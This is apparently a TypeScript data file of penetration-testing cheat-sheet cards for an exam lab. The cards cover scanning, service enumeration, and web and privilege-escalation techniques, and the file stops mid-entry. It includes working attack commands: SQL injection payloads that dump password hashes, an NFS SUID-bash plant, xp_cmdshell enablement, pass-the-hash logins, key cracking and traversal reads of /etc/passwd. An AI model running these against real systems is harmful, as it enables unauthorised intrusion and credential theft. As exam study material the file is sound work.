import { MORE_TECHNIQUES } from "./more";
import { PRIVESC_TECHNIQUES } from "./privesc";
import { BRIEFS } from "./briefs";
import { COVER } from "./cover";
import { SERVICES_MORE } from "./services-more";
import { COMMANDS } from "./commands";
import { API_TECHNIQUES } from "./api";

export type Technique = {
  id: string;
  section: string;
  title: string;
  look: string;
  cmd: string;
  alive: string;
  dead: string;
  next: string;
};

export const SECTIONS = [
  "Exam",
  "Recon",
  "Services",
  "Web",
  "API",
  "Shells",
  "Commands",
  "Linux",
  "Windows",
  "Active Directory",
  "Passwords",
  "Tunneling",
  "Compile",
  "Report",
] as const;

const CORE: Technique[] = [
  {
    id: "exam-order",
    section: "Exam",
    title: "Order of work",
    look: "Every host starts the same way. Make a folder, then scan TCP and UDP before you look at an exploit. SNMP, TFTP, NTP, and IKE never appear on a TCP scan, so a host with no UDP pass is only half mapped. After both scans, work one open service, then the shell, then that operating system from the top.",
    cmd: `# Per host folder first. <ip> is the real address. Do not type the brackets.
mkdir -p ~/exam/<ip>/{scans,loot,shells}

# 1. Common TCP ports, with the default scripts and versions. Read this while step 2 runs.
nmap -Pn -sC -sV -oA scans/quick <ip>
# 2. Every TCP port. A service on a high port is normal here.
nmap -Pn -p- --min-rate 2000 -oA scans/alltcp <ip>
# 3. UDP. This is required on every host, not a scan you add when TCP looks empty.
# Top 20 is the exam pass. All 65535 UDP ports will take the morning.
sudo nmap -Pn -sU --top-ports 20 -T4 -oA scans/udp <ip>
# 4. Versions only on TCP ports that step 2 added.
nmap -Pn -sC -sV -p <new-ports> -oA scans/deep <ip>
# 5. One service card for each port that is actually open, TCP or UDP.
# 6. Shell, then the Linux or Windows page from the top.
# 7. Any new password gets tried on the other hosts before you leave.`,
    alive: "You can name the next single check, and both the TCP list and the UDP top 20 exist under scans/.",
    dead: "You started from a kernel exploit, or you finished TCP and skipped UDP. Re-running the same scan is not the missing pass.",
    next: "Open Services for one open port. nmap top 20 is the UDP port pass. The Recon page runs these four scans, and the Nmap tab reads the XML. The UDP protocol scanner on that page is Cisco's tool: it sends a real DNS, NTP, TFTP, or SNMP packet and shows the reply in the terminal.",
  },
  {
    id: "exam-stuck",
    section: "Exam",
    title: "When you are stuck",
    look: "A dead vector feels like activity. A live one has a precondition you can prove.",
    cmd: `# Ask, in order:
# 1. Did I finish service enum on every open port?
# 2. Did I try every password I already have, on every host?
# 3. Did I check localhost-only ports and a second NIC?
# 4. Did I read history, configs, and shares, not just PEAS red text?
# 5. Only then: version bugs (sudo, kernel) as last resort.`,
    alive: "A new credential, a writable path, an unquoted service, SeImpersonate, or NOPASSWD sudo.",
    dead: "Re-running the same nmap, the same gobuster wordlist, or a 441-byte 'exe' that is not a real binary.",
    next: "Write the failed check in one line so you do not repeat it. Move to the next card in the same section.",
  },
  {
    id: "exam-proof",
    section: "Exam",
    title: "Proof screenshots",
    look: "The screenshot must show the flag, the target IP, and your privilege in one frame. A cropped flag, or three separate commands, fails review.",
    cmd: `# One command, one screenshot. Do not crop.
# hostname -I is a single line, so the flag stays on screen. ip a is too tall.
# Linux, low user
id; hostname; hostname -I; cat /home/<user>/local.txt
# Linux, root
id; hostname; hostname -I; cat /root/proof.txt

# Windows. & continues even if one command fails.
whoami & hostname & ipconfig & type C:\\Users\\<user>\\Desktop\\local.txt
whoami & hostname & ipconfig & type C:\\Users\\Administrator\\Desktop\\proof.txt`,
    alive: "whoami is the low user for local.txt, and root or nt authority\\system (or a local admin) for proof.txt, with the IP visible.",
    dead: "Flag text copied into notes with no screenshot, or a screenshot that hides the prompt.",
    next: "Save the image in that host's folder before you pivot away.",
  },
  {
    id: "recon-nmap",
    section: "Recon",
    title: "Nmap",
    look: "Four passes, then you stop scanning. The first names the common TCP services. The second finds TCP ports outside that list. The third is UDP, which a TCP scan cannot see. The fourth asks for versions only on the new TCP ports. Ignore closed ports.",
    cmd: `nmap -Pn -sC -sV -oA scans/quick <ip>
nmap -Pn -p- --min-rate 2000 -oA scans/alltcp <ip>
sudo nmap -Pn -sU --top-ports 20 -T4 -oA scans/udp <ip>
nmap -Pn -sC -sV -p <open> -oA scans/deep <ip>`,
    alive: `PORT     STATE SERVICE VERSION
8000/tcp open  http    Apache httpd 2.4.54 ((Win64) PHP/7.4.30)
445/tcp  open  microsoft-ds
2222/tcp open  ssh     OpenSSH`,
    dead: "All filtered, or only 135/139 with no 445 and no web. Do not spend 40 minutes on RPC alone.",
    next: "One service at a time, highest value first: web, SMB, FTP, SSH, WinRM, MSSQL. The same four scans can be started from the Recon page, and searchsploit is there for the version string.",
  },
  {
    id: "recon-search",
    section: "Recon",
    title: "Version to exploit",
    look: "A version only matters if searchsploit or a CMS admin panel gives a public issue you can reach. 'Apache 2.4' by itself is not a foothold.",
    cmd: `searchsploit <name> <version>
searchsploit -x <id> | head`,
    alive: "A matching title for the exact product (RiteCMS upload, sudo 1.8.31, a CMS you can log into).",
    dead: "A kernel CVE for a fully patched 2022 box with dozens of hotfixes, or an exploit that needs a module you cannot reach.",
    next: "Confirm the precondition (login, writable path, old sudo) before you compile anything.",
  },
  {
    id: "svc-map",
    section: "Services",
    title: "Port decision",
    look: "Each port has one first check. If that check is empty, leave the port. The card for that service has how to talk to it and what an actual win looks like.",
    cmd: `# 21 FTP          anonymous, then files. Write only if it is a web root.
# 22 SSH          banner, then a key or a password you already have
# 25/465/587 SMTP VRFY names. Not a shell.
# 53 DNS          zone transfer, then the certificate name
# 69/udp TFTP     one filename from the enum script
# 80 HTTP         title and one directory list
# 110/995 POP     a mailbox you already have a password for
# 111/2049 NFS    showmount, then squash
# 123/udp NTP     does it answer. monlist is a host list, not a shell.
# 137/139 NetBIOS name and workgroup, then SMB
# 143/993 IMAP    same as POP
# 389/636 LDAP    anonymous base, then descriptions
# 443 HTTPS       certificate name, then the same web cards
# 445 SMB         null, then guest, then the password you have
# 512-514 rlogin  only with a user or a .rhosts you already found
# 5900 VNC        no auth, or a password you already have
# 5985 WinRM      nxc, then evil-winrm
# 1433/3306/5432/1521  SQL. The SQL card picks the client.
# 3389 RDP        nxc rdp, then the GUI
# 500/udp IKE    ike-scan. A transform is not a password.
# 623/udp IPMI   one default, then the hash on SSH
# 5060 SIP       methods and extensions. An extension is a username.
# 5353/udp mDNS  the hostname only. Do not answer for it.
# 548 AFP        guest volumes, then read them like a share
# 631 CUPS       the printer page. 401 means a normal login.
# 1099 RMI       the bound name. Unknown class, stop.
# 2049 NFS       already above. 3128 is a proxy, not a shell.
# 3690 SVN       list the repo. Read it. Do not commit.
# 6000 X11       only if access is granted
# 8009 AJP       Tomcat's backend. Check the HTTP port beside it.
# 9200 Elastic   indices, then one search
# 11211 Memcached stats, then one key. Do not flush.
# 2375 Docker    /version with no login is root on that host
# 27017 Mongo    list databases only if it did not ask for a password
# high port       the same service as the low one`,
    alive: "A share, an anonymous login, a directory, or a banner that names a product.",
    dead: "A port that accepts TCP and then gives you nothing to read. Move on.",
    next: "Open the card for that service.",
  },
  {
    id: "svc-ftp",
    section: "Services",
    title: "FTP",
    look: "Anonymous login, or a password you already found. First you list. Then you read. You upload only when the directory is something the host will execute.",
    cmd: `# FIRST
ftp <ip>
# Name: anonymous   Password: (empty, or anonymous)
ls -la
get <file>
bye
# TALK, non-interactive
wget -m ftp://anonymous:anonymous@<ip>/
nxc ftp <ip> -u anonymous -p ''
# USE IT
# a pdf, txt, config, or key: read it, take the password, try it on SSH and the web login
# a directory you can put into, and the web root or a cron job is that directory:
# put a webshell or a script. Confirm it is requested. Then stop uploading.
# banner exactly vsftpd 2.3.4: one backdoor PoC you have practised. Any other banner is not that bug.`,
    alive: `230 Login successful.
-r--r--r-- 1 ftp ftp  umbraco.pdf`,
    dead: "530 Login incorrect and you have no other creds. Do not hydra the whole rockyou list in the first hour.",
    next: "Read every downloaded file for users, passwords, and hostnames. Add those names to /etc/hosts if the site wants an FQDN.",
  },
  {
    id: "svc-ssh",
    section: "Services",
    title: "SSH and private keys",
    look: "First the banner, so you know it is SSH. Then a key or a password you already found. You cannot read a passphrase out of the key file. A version string is not an exploit unless it is one you have already practised for that exact build.",
    cmd: `# FIRST
nc -nv <ip> 22
# TALK
ssh <user>@<ip>
chmod 600 id_key
ssh -i id_key <user>@<ip>
ssh-keygen -y -f id_key
# a prompt here means the key is protected
ssh2john id_key > key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
# USE IT
# a shell: id, then sudo -l, then the Linux page
# you will need a tunnel later: SSH -L, -D, or -R. Do that before you upload Chisel.`,
    alive: `Enter passphrase for key 'id_key':
# after john:
id_key:fireball
# then a shell as that user`,
    dead: "Permission denied (publickey) with the wrong user, or 'no password hashes loaded' because the file is not a key.",
    next: "Once in: id, sudo -l, then the Linux page. Do not start with kernel.",
  },
  {
    id: "svc-smb",
    section: "Services",
    title: "SMB shares",
    look: "First null, then guest, then a password you already have. READ means download. WRITE means upload only if something on the host will run that file. (Pwn3d!) means admin, and that is a shell. No relay, no poison, no coerce.",
    cmd: `# FIRST
nxc smb <ip> -u '' -p ''
nxc smb <ip> -u guest -p ''
smbclient -N -L //<ip>/
# TALK
smbclient //<ip>/<share> -N
# ls, get file, put file
smbmap -H <ip> -u <user> -p '<pass>' -d <DOMAIN>
smbclient //<ip>/<share> -U '<DOMAIN>/<user>%<pass>' -c 'prompt OFF; recurse ON; mget *'
# USE IT
# READ: grep the download for password, user, key
# WRITE into a web root: upload one shell, request it once
# nxc says (Pwn3d!): you are admin
nxc smb <ip> -u <user> -p '<pass>' -x whoami
# a hash you already have, before you crack it
nxc smb <ip> -u <user> -H <nt>
# MS17-010 only if the script says VULNERABLE. One PoC. Then stop.
nmap -Pn -p445 --script smb-vuln-ms17-010 <ip>`,
    alive: `transfer   READ, WRITE
Users      READ ONLY
ADMIN$     NO ACCESS`,
    dead: "NT_STATUS_ACCESS_DENIED on every share, including null. Stop. Come back when you have a password.",
    next: "grep the download for password, user, key, flag. Upload only to a share marked WRITE.",
  },
  {
    id: "svc-http",
    section: "Services",
    title: "HTTP first pass",
    look: "Title, server header, a vhost, a CMS path. 80 and 8080 and 8000 are this card. 443 is the HTTPS card first, because the certificate name changes the host.",
    cmd: `# FIRST
curl -sI http://<ip>/
whatweb http://<ip>
# TALK
gobuster dir -u http://<ip>/ -w /usr/share/wordlists/dirb/common.txt -q
# a name the site demands
echo '<ip> web.exam.local' | sudo tee -a /etc/hosts
curl -sI http://web.exam.local/
# USE IT
# a product name: the Web section, default creds for that product, then one bug class
# a login: the password you already found, once, in the browser
# not a TLS problem and not a missing header`,
    alive: `/cms (Status: 301)
/cms/admin.php
Title: something other than 'IIS Windows Server'`,
    dead: "Only / and a default page, and the bigger wordlist also returns nothing. Check other ports (8000, 8080) before a third wordlist.",
    next: "Identify the product, then try default creds for that product before you hunt CVEs.",
  },
  {
    id: "svc-smtp",
    section: "Services",
    title: "SMTP",
    look: "25, 465, 587. First the banner and whether VRFY is allowed. Mail gives you usernames. An open relay is a note, not a shell.",
    cmd: `# FIRST
nc -nv <ip> 25
# banner, then type
# EHLO exam
# VRFY root
# EXPN root
# TALK
nmap -Pn -p 25,465,587 --script smtp-commands,smtp-enum-users <ip>
# one relay check. 250 to a recipient you did not authenticate for means it relays.
# MAIL FROM:<a@a.com>
# RCPT TO:<b@b.com>
# USE IT
# names go to the user list for SMB, WinRM, and the web login
# a password inside a bounce or a banner is tried once, by hand
# you do not send mail and you do not hydra SMTP`,
    alive: "250 User exists for names you can add to a spray list.",
    dead: "Connection refused to VRFY and no webmail. Do not camp here.",
    next: "Take the names to SMB, WinRM, or the web login.",
  },
  {
    id: "svc-dns",
    section: "Services",
    title: "DNS",
    look: "53. First a zone transfer. If the app wants a hostname, the certificate or the error page tells you the name. DNS is a map, not a shell.",
    cmd: `# FIRST
dig axfr @<ip> <domain>
dig @<ip> <domain> NS
dig @<ip> <domain> TXT
# TALK
host -l <domain> <ip>
dnsrecon -d <domain> -n <ip> -t axfr
# the site breaks until the name resolves
echo '<ip> web.exam.local' | sudo tee -a /etc/hosts
curl -sI http://web.exam.local/
# USE IT
# every new hostname in the exam range gets the HTTP card
# a TXT record with a password is tried on SSH and the web login
# DNSAdmins is the AD card, and only if whoami /groups already showed it`,
    alive: "A list of hostnames, or the site changes after you set the hosts entry.",
    dead: "Transfer refused and the site works by IP. Skip.",
    next: "Enumerate the new names. Do not scan the whole domain if you are on a single lab host.",
  },
  {
    id: "svc-snmp",
    section: "Services",
    title: "SNMP",
    look: "Community string public or private, then users and processes inside the walk.",
    cmd: `onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <ip>
snmpwalk -v2c -c public <ip>`,
    alive: "sysDescr plus a user or a command line with a password.",
    dead: "Timeout on public and private. Leave it.",
    next: "Reuse any string you find. SNMP rarely gives a shell by itself.",
  },
  {
    id: "svc-ldap",
    section: "Services",
    title: "LDAP",
    look: "389 or 636. First an anonymous base search, so you learn the DC= suffix. Then users and description. A password in description is the win. LDAPS is the same search with a different URL.",
    cmd: `# FIRST
ldapsearch -x -H ldap://<ip> -s base namingcontexts
# TALK. Use the suffix it just printed.
ldapsearch -x -H ldap://<ip> -b 'DC=exam,DC=local' '(objectClass=person)' sAMAccountName description info
# creds you already have
ldapsearch -x -H ldap://<ip> -D '<user>@exam.local' -w '<pass>' -b 'DC=exam,DC=local' '(objectClass=user)' sAMAccountName description
# 636
ldapsearch -x -H ldaps://<ip> -s base namingcontexts
# dump, once the bind works
ldapdomaindump -u '<domain>\\<user>' -p '<pass>' ldap://<ip> -o loot/ldap
# USE IT
# a password in description or info: try it on SMB and WinRM
# a user list: save it. Do not spray it yet.`,
    alive: "A naming context and user entries. Bonus: description contains a password.",
    dead: "Operations error / strong auth required and you have no creds.",
    next: "Spray what you found. If this is a DC, move to the AD section.",
  },
  {
    id: "svc-nfs",
    section: "Services",
    title: "NFS",
    look: "111 and 2049. First showmount. Then mount and read ls -la. root_squash means you become nobody. no_root_squash means files you create as root on Kali stay root on the server. A file owned by uid 1000 is yours if you become uid 1000.",
    cmd: `# FIRST
showmount -e <ip>
# TALK
mkdir -p /mnt/nfs
sudo mount -t nfs <ip>:/share /mnt/nfs -o nolock
ls -la /mnt/nfs
# USE IT. uid impersonation when the file is owned by 1000 and squash is on
sudo useradd -u 1000 nfsuser 2>/dev/null
sudo -u nfsuser cp /mnt/nfs/id_rsa ~/loot/
# no_root_squash
sudo cp /bin/bash /mnt/nfs/rootbash
sudo chmod 4755 /mnt/nfs/rootbash
# on the server
/share/rootbash -p
id
# later, on the server, the proof of the option
cat /etc/exports`,
    alive: `/home * (rw,no_root_squash)
# files owned by a uid you can impersonate`,
    dead: "Export list empty, or mount works but every file is root-only and squash is on.",
    next: "Copy keys or, if no_root_squash, plant a SUID bash from a root-mapped mount.",
  },
  {
    id: "svc-sql",
    section: "Services",
    title: "A SQL port is open",
    look: "You are on Kali. The port number picks the client. Do not open mysql against 1433. The banner confirms the engine. One login you already have a reason to try. No wordlist.",
    cmd: `# FIRST
nc -nv <ip> <port>
nmap -Pn -sV -p <port> <ip>
# 3306   mysql -h <ip> -P 3306 -u root -p
# 1433   nxc mssql, then impacket-mssqlclient
# 5432   psql -h <ip> -p 5432 -U postgres -d postgres
# 1521   sqlplus, and only if which sqlplus prints a path
# 1434/udp names the instance. It is not a login.
nmap -Pn -sU -p 1434 --script ms-sql-info <ip>
which sqlplus`,
    alive: "The banner names MySQL, MariaDB, Microsoft SQL, PostgreSQL, or Oracle, and you know which card is next.",
    dead: "The port accepts TCP and the version scan says unknown. One nc. Then leave it. Do not guess clients.",
    next: "The engine card. A password from a web config is tried once. An empty sa or empty root is the one default.",
  },
  {
    id: "svc-mysql",
    section: "Services",
    title: "MySQL",
    look: "3306 from Kali. root with an empty password, or the user and password already sitting in a config. Every statement inside the client ends with a semicolon. A hash you can reuse beats a file-write.",
    cmd: `# FIRST
nc -nv <ip> 3306
mysql -h <ip> -P 3306 -u root -p
# Enter for an empty password. A space after -p is not the password.
# a password you already found, no space after -p
mysql -h <ip> -P 3306 -u <user> -p'<pass>'
# INSIDE
SHOW DATABASES;
USE <db>;
SHOW TABLES;
SELECT * FROM users LIMIT 20;
SELECT user,file_priv FROM mysql.user;
# USE IT
# FILE priv is Y. This reads a file. It does not give you a shell.
SELECT LOAD_FILE('/etc/passwd');
# INTO OUTFILE only if you already know a web root this account can write
# a UDF is not the next step`,
    alive: "Welcome to the MariaDB or MySQL monitor, then a list of databases. A password or a hash in a table.",
    dead: "Access denied, and the web app did not give you a password. Do not hydra 3306.",
    next: "The hash goes to the identify builder. Reuse a clear password on SSH and the web login before you think about writing a file.",
  },
  {
    id: "svc-mssql",
    section: "Services",
    title: "MSSQL",
    look: "1433 from Kali. nxc checks the login. impacket-mssqlclient is the shell. SQL auth and Windows auth are different commands. xp_cmdshell is only enabled after the server already says you are sysadmin.",
    cmd: `# FIRST
nmap -Pn -sV -p 1433 <ip>
nxc mssql <ip> -u sa -p ''
nxc mssql <ip> -u sa -p '<pass>'
nxc mssql <ip> -u '<domain>\\<user>' -p '<pass>'
# TALK. SQL login
impacket-mssqlclient sa:'<pass>'@<ip>
# Windows login
impacket-mssqlclient '<domain>/<user>:<pass>'@<ip> -windows-auth
# INSIDE
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
EXEC xp_cmdshell 'whoami';
# 1 from the role check, and xp_cmdshell says it is off
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
# role check was 0. One impersonation query, then stop.
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
EXECUTE AS LOGIN = 'sa';`,
    alive: "xp_cmdshell prints a Windows user, or IS_SRVROLEMEMBER returns 1, or EXECUTE AS LOGIN = 'sa' works.",
    dead: "Login failed for sa and for the password you already hold. This port is not EternalBlue. Leave it.",
    next: "whoami from xp_cmdshell is the service account. SeImpersonate on that token is a Potato. It is not another SQL statement.",
  },
  {
    id: "svc-rdp",
    section: "Services",
    title: "RDP",
    look: "3389. First confirm the password with nxc. Then open the desktop. RDP is a login, not an exploit. A hash is only for /pth after nxc already says that hash is an admin.",
    cmd: `# FIRST
nxc rdp <ip> -u <user> -p '<pass>'
# TALK
xfreerdp /v:<ip> /u:<user> /p:'<pass>' /cert:ignore /dynamic-resolution +clipboard /drive:loot,/tmp/loot
# hash, only after nxc smb with -H already showed admin
xfreerdp /v:<ip> /u:<user> /pth:<nt> /cert:ignore
# USE IT
# proof.txt on the desktop, a password in a file, a mapped drive so you can copy it out
# logon type denied: the password can still be WinRM or SMB. Do not hydra RDP.`,
    alive: "A desktop. whoami shows the user you expected.",
    dead: "Account restrictions or logon type denied. The password can still work for WinRM or SMB.",
    next: "Prefer WinRM or a shell for exam speed. Use RDP when you need a GUI (BloodHound collection is usually not that).",
  },
  {
    id: "svc-winrm",
    section: "Services",
    title: "WinRM",
    look: "5985, or 5986 for HTTPS. First nxc. Then evil-winrm. This is a shell you already earned with a password or a hash. It is not an exploit.",
    cmd: `# FIRST
nxc winrm <ip> -u <user> -p '<pass>'
nxc winrm <ip> -u <user> -H <nt>
# TALK
evil-winrm -i <ip> -u <user> -p '<pass>'
evil-winrm -i <ip> -u <user> -H <nt>
# inside the shell
upload /tmp/agent.exe C:\\Users\\Public\\agent.exe
download C:\\Users\\<user>\\Desktop\\proof.txt /tmp/proof.txt
# USE IT
whoami /all
# then the Windows page, top to bottom
# not in Remote Management Users: the same password on SMB is still worth a share listing`,
    alive: `Evil-WinRM shell
*Evil-WinRM* PS C:\\Users\\<user>>`,
    dead: "WinRM is not available or the user is not in Remote Management Users. Try SMB with the same password.",
    next: "whoami /all immediately. Then the Windows page.",
  },
  {
    id: "web-id",
    section: "Web",
    title: "Identify the app",
    look: "Product name and version in the page, footer, /admin, readme, or a generator meta tag. Default creds are product-specific.",
    cmd: `curl -s http://<ip>:<port>/ | head
# common first logins to try only after you know the product
# admin / admin
# admin / password`,
    alive: "A named CMS (RiteCMS, WordPress, Umbraco, DNN, Joomla) and a login that accepts a default pair.",
    dead: "A custom page with no version and no login. Do not searchsploit 'Apache'.",
    next: "If you are in an admin panel, look for upload, template edit, or plugin install before you hunt a CVE.",
  },
  {
    id: "web-lfi",
    section: "Web",
    title: "LFI and traversal",
    look: "A parameter that names a file: page, file, view, template, path, doc. Changing it changes the body.",
    cmd: `# Linux targets
curl -s 'http://<ip>/index.php?page=../../../../etc/passwd'
# Windows
curl -s 'http://<ip>/index.php?page=../../../../windows/win.ini'
# PHP wrappers, only if you already proved file read
curl -s 'http://<ip>/index.php?page=php://filter/convert.base64-encode/resource=index.php'`,
    alive: "root:x:0:0: or a [fonts] section from win.ini, or a base64 blob that decodes to PHP.",
    dead: "The same HTML every time, or a generic 404. One encoding trick is enough. Do not spend an hour on filters you have not confirmed.",
    next: "Read source, configs, and SSH keys. A key still needs the passphrase check (SSH card).",
  },
  {
    id: "web-sqli",
    section: "Web",
    title: "SQLi 1 — prove it",
    look: "A parameter that changes a database result: id, user, search, category. An error, a boolean change, or a time delay.",
    cmd: `# error or boolean
curl -s 'http://<ip>/item.php?id=1' 
curl -s "http://<ip>/item.php?id=1'"
curl -s "http://<ip>/item.php?id=1 AND 1=1"
curl -s "http://<ip>/item.php?id=1 AND 1=2"
# time, only if boolean is unclear
curl -s "http://<ip>/item.php?id=1 AND SLEEP(3)"`,
    alive: "SQL syntax error, or the page differs between 1=1 and 1=2, or SLEEP actually delays.",
    dead: "Identical pages and no delay. It is not injectable. Do not start sqlmap. On this exam sqlmap is a banned automatic tool.",
    next: "Same page with no error and no delay: the parameter is dead. Quote error or a true/false change: SQLi 2 if you can see output, SQLi 3 if the page only changes, SQLi 4 if the page stays the same and time moves. One password that logs you in is enough. Do not dump the whole database.",
  },
  {
    id: "web-sqli-union",
    section: "Web",
    title: "SQLi 2 — UNION",
    look: "You proved the parameter, and the page shows query results (a product name, a username, a row). UNION adds your SELECT onto that result. You need the same number of columns, and you need one column that is actually printed.",
    cmd: `# raise the number until the page errors. The last number that still works is the column count.
curl -s "http://<ip>/item.php?id=1' ORDER BY 1-- -"
curl -s "http://<ip>/item.php?id=1' ORDER BY 2-- -"
curl -s "http://<ip>/item.php?id=1' ORDER BY 3-- -"
# three columns in this example. A number you sent that appears in the HTML is the column you write into.
curl -s "http://<ip>/item.php?id=1' UNION SELECT 1,2,3-- -"
# MySQL. Put the dump in the column that reflected (here, column 2).
curl -s "http://<ip>/item.php?id=1' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata-- -"
curl -s "http://<ip>/item.php?id=1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='appdb'-- -"
curl -s "http://<ip>/item.php?id=1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -"
curl -s "http://<ip>/item.php?id=1' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM appdb.users-- -"`,
    alive: "ORDER BY 3 works and ORDER BY 4 errors. A number from UNION SELECT is visible in the page. group_concat then prints a database, a table, and a user:hash.",
    dead: "Every ORDER BY errors, UNION is stripped, or the column count is right but no number is reflected. Fall back to SQLi 3. Do not keep adding columns past 8.",
    next: "The hash goes to the Passwords section. If the clear password is already there, log in and stop. MSSQL uses information_schema the same way, and the comment is -- with a space. Oracle is not this syntax. SQLi 5 names the engine.",
  },
  {
    id: "web-sqli-bool",
    section: "Web",
    title: "SQLi 3 — boolean",
    look: "No useful error and nothing from UNION, but AND 1=1 returns the row and AND 1=2 does not. You ask yes/no questions. True looks like the original page. False looks empty or different.",
    cmd: `# baseline you already proved
curl -s "http://<ip>/item.php?id=1 AND 1=1"
curl -s "http://<ip>/item.php?id=1 AND 1=2"
# how long is the current database name. Raise the number until the true page returns.
curl -s "http://<ip>/item.php?id=1 AND length(database())=1"
curl -s "http://<ip>/item.php?id=1 AND length(database())=7"
# first character. substring(value, start, length). Start is 1, not 0. Walk a-z, 0-9, underscore.
curl -s "http://<ip>/item.php?id=1 AND substring(database(),1,1)='a'"
curl -s "http://<ip>/item.php?id=1 AND substring(database(),1,1)='h'"
# check the whole guess
curl -s "http://<ip>/item.php?id=1 AND substring(database(),1,7)='hacking'"
# or a pattern, which is faster than one letter when you have a guess
curl -s "http://<ip>/item.php?id=1 AND database() LIKE '%ack%'"`,
    alive: "length 6 is the false page and length 7 is the true page. One letter returns the true page and the neighbours do not. LIKE '%ack%' matches.",
    dead: "1=1 and 1=2 look the same. There is no boolean. Go to SQLi 4 once. If time is also flat, the parameter is dead.",
    next: "Same questions against a column once you know the table: substring((SELECT password FROM users LIMIT 1),1,1)='a'. Stop when you have one password. LIKE patterns: %text% is anywhere, text% is the start, %text is the end, _ is one unknown character.",
  },
  {
    id: "web-sqli-time",
    section: "Web",
    title: "SQLi 4 — time",
    look: "The page body never changes, so boolean has nothing to compare. A true condition sleeps. A false one does not. Time the normal request first, or a slow app will look injectable.",
    cmd: `# MySQL. True sleeps 3 seconds. False returns immediately.
curl -s -o /dev/null -w '%{time_total}\\n' "http://<ip>/item.php?id=1 AND IF(1=1,SLEEP(3),0)"
curl -s -o /dev/null -w '%{time_total}\\n' "http://<ip>/item.php?id=1 AND IF(1=2,SLEEP(3),0)"
# then a real question. length, then one character, same as SQLi 3.
curl -s -o /dev/null -w '%{time_total}\\n' "http://<ip>/item.php?id=1 AND IF(length(database())=7,SLEEP(3),0)"
curl -s -o /dev/null -w '%{time_total}\\n' "http://<ip>/item.php?id=1 AND IF(substring(database(),1,1)='h',SLEEP(3),0)"
# MSSQL, if the engine is SQL Server
curl -s -o /dev/null -w '%{time_total}\\n' "http://<ip>/item.php?id=1; WAITFOR DELAY '0:0:3'--"`,
    alive: "1=1 takes about 3 seconds more than 1=2. The length or the character that is right sleeps. The one that is wrong does not.",
    dead: "Both requests take the same time. One sleep that never repeats is a slow page, not a bug. Stop. Do not run sqlmap to 'be sure'.",
    next: "Ask the same substring questions you would in SQLi 3, one character at a time. Postgres uses pg_sleep(3). Oracle uses dbms_pipe.receive_message(('a'),3). If you do not know the engine, SQLi 5.",
  },
  {
    id: "web-sqli-engine",
    section: "Web",
    title: "SQLi 5 — which engine",
    look: "The error text or @@version tells you MySQL, MSSQL, Postgres, or Oracle. Comments, concatenation, and stacked queries are not the same. A payload from the wrong engine looks like a dead parameter.",
    cmd: `# comment that cuts off the rest of the query
# MySQL:      -- -     or #
# MSSQL:      --
# Postgres:   --
# Oracle:     --
# version, inside the column UNION can print
# MySQL / MSSQL:  @@version
# Postgres:       version()
# Oracle:         banner FROM v$version
# stacked query (the second statement runs; its rows often do not come back)
# MSSQL and Postgres:  '; <second statement>--
# MySQL through PHP usually cannot stack. A semicolon there is dead.
# join two strings
# Oracle / Postgres:  'a'||'b'
# MSSQL:              'a'+'b'
# MySQL:              CONCAT('a','b')`,
    alive: "The error names the product, or @@version / version() prints it. A MySQL -- - works and a bare -- does not, or the other way around.",
    dead: "You have no error and no version. Keep the MySQL forms (SLEEP, substring, -- -) for one pass. If those are dead, try WAITFOR once for MSSQL. Then leave the parameter.",
    next: "Back to SQLi 2, 3, or 4 with the matching comment and the matching sleep. Out-of-band DNS needs a name you control and is not the exam path. Burp Collaborator is Burp Pro, which you do not have.",
  },
  {
    id: "web-sqli-login",
    section: "Web",
    title: "SQLi 6 — login form",
    look: "A username box, not an id in the URL. Same proof as SQLi 1: a true condition logs in or changes the error, a false one does not. One quote with no comparison proves nothing.",
    cmd: `# true, then false. Both, or you cannot trust the login.
admin' OR '1'='1'-- -
admin' AND '1'='2'-- -
# numeric style, if the quotes are already around the value
' OR 1=1-- -
' OR 1=2-- -`,
    alive: "The true payload gets a session or a different page. The false payload stays on the login error.",
    dead: "Both say invalid, or both log you in. The second case is a broken form, not a database. Stop.",
    next: "You are that user. Look for upload, admin, or a password in the session. Do not pivot into a UNION on a form that already authenticated you unless the session is useless.",
  },
  {
    id: "web-upload",
    section: "Web",
    title: "File upload",
    look: "An authenticated upload that lands in a web-accessible folder. The extension and the Content-Type are the checks. The path of the uploaded file is the shell.",
    cmd: `# after a normal login to the product
# upload a tiny php or aspx that prints the user
# then request the URL the app returns
curl -s http://<ip>/uploads/test.php`,
    alive: "The response body is the command output, or whoami, not the source code of your file.",
    dead: "The file is stored but the server downloads it as an attachment, or it is renamed outside the web root.",
    next: "Catch it with Penelope (Shells). Do not build a reverse shell until the upload executes.",
  },
  {
    id: "web-cmdi",
    section: "Web",
    title: "Command injection",
    look: "A field that obviously runs a command: ping, traceroute, filename passed to a converter, backup name.",
    cmd: `# prove it with something visible
ping 127.0.0.1; id
# or
127.0.0.1 | whoami`,
    alive: "uid= or a Windows username under the ping output.",
    dead: "The app says invalid IP and your extra characters never run. Stop.",
    next: "Replace the test with a Penelope reverse shell only after id works.",
  },
  {
    id: "web-ssti",
    section: "Web",
    title: "SSTI",
    look: "A field that reflects your input into a template: names, emails, previews. {{7*7}} becoming 49 is the proof.",
    cmd: `# send, in a reflected field
{{7*7}}
\${7*7}
#{7*7}`,
    alive: "The page shows 49, not the braces.",
    dead: "The braces come back unchanged or are stripped. It is XSS or nothing, not SSTI.",
    next: "Identify the engine from the payload that worked, then command execution for that engine. Do not spray every payload.",
  },
  {
    id: "web-cms",
    section: "Web",
    title: "CMS",
    look: "WordPress, Joomla, Drupal, Umbraco, DNN, RiteCMS. Version in readme, meta generator, or the admin footer.",
    cmd: `wpscan --url http://<ip> --enumerate u,p
# joomla
droopescan scan joomla -u http://<ip>
# then the admin path the scanner prints`,
    alive: "A version plus an admin login, or a plugin with a known issue you can reach without auth.",
